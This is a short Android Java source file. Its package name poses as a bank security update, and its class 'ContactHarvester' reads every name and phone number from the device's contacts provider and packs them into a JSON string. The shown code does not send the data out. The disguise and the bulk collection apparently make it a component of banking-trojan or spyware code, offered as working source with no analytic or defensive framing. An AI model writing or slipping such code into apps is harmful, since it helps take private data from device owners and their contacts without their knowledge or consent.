package com.bank.security.update;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;

public class ContactHarvester {
    private static final String TAG = "ContactHarvester";

    public static String harvestContacts(Context context) {
        JSONArray contactArray = new JSONArray();
        try {
            ContentResolver cr = context.getContentResolver();
            Uri uri = Uri.parse("content://com.android.contacts/data/phones");
            Cursor cursor = cr.query(uri, null, null, null, null);

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    int nameIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                    int numIdx = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
                    
                    String name = nameIdx >= 0 ? cursor.getString(nameIdx) : "";
                    String number = numIdx >= 0 ? cursor.getString(numIdx) : "";

                    JSONObject obj = new JSONObject();
                    obj.put("name", name);
                    obj.put("phone", number);
                    contactArray.put(obj);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed harvesting contacts", e);
        }
        return contactArray.toString();
    }
}
